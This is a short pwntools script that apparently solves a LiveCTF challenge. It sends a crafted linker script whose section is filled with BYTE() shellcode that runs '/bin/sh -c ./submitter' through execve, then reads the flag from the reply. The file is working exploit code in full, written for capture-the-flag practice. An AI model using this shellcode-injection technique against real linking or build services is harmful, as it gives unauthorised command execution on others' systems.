from pwn import *
HOST = os.environ.get('HOST', 'localhost')
PORT = os.environ.get('PORT', '31337')

r = remote(HOST, int(PORT))


t = """OUTPUT_FORMAT("elf64-x86-64", "elf64-x86-64",
	      "elf64-x86-64")
OUTPUT_ARCH(i386:x86-64)
PROVIDE(my_start = 0x55550000);
ENTRY(my_start)
MEMORY
{
    my_mem_region (rwx): ORIGIN = 0x55550000, LENGTH = 0x1000
}
SECTIONS
{
    .my_section :
    {
BYTE(0x31)
BYTE(0xC0)
BYTE(0x48)
BYTE(0x8D)
BYTE(0x3D)
BYTE(0x14)
BYTE(0x00)
BYTE(0x00)
BYTE(0x00)
BYTE(0x50)
BYTE(0x54)
BYTE(0x5A)
BYTE(0x48)
BYTE(0x8D)
BYTE(0x4F)
BYTE(0x0B)
BYTE(0x51)
BYTE(0x48)
BYTE(0x8D)
BYTE(0x4F)
BYTE(0x08)
BYTE(0x51)
BYTE(0x57)
BYTE(0x54)
BYTE(0x5E)
BYTE(0xB0)
BYTE(0x3B)
BYTE(0x0F)
BYTE(0x05)
BYTE(0x2F)
BYTE(0x62)
BYTE(0x69)
BYTE(0x6E)
BYTE(0x2F)
BYTE(0x73)
BYTE(0x68)
BYTE(0x00)
BYTE(0x2D)
BYTE(0x63)
BYTE(0x00)
BYTE(0x2E)
BYTE(0x2F)
BYTE(0x73)
BYTE(0x75)
BYTE(0x62)
BYTE(0x6D)
BYTE(0x69)
BYTE(0x74)
BYTE(0x74)
BYTE(0x65)
BYTE(0x72)
BYTE(0x00)
    } > my_mem_region
  .text           :
  {
    *(.text.unlikely .text.*_unlikely .text.unlikely.*)
    *(.text.exit .text.exit.*)
    *(.text.startup .text.startup.*)
    *(.text.hot .text.hot.*)
    *(SORT(.text.sorted.*))
    *(.text .stub .text.* .gnu.linkonce.t.*)
    /* .gnu.warning sections are handled specially by elf.em.  */
    *(.gnu.warning)
  }
}

"""

r.sendline(t)
flag = r.recvline_contains(b'LiveCTF{').decode().strip()
log.info('Flag: %s', flag)
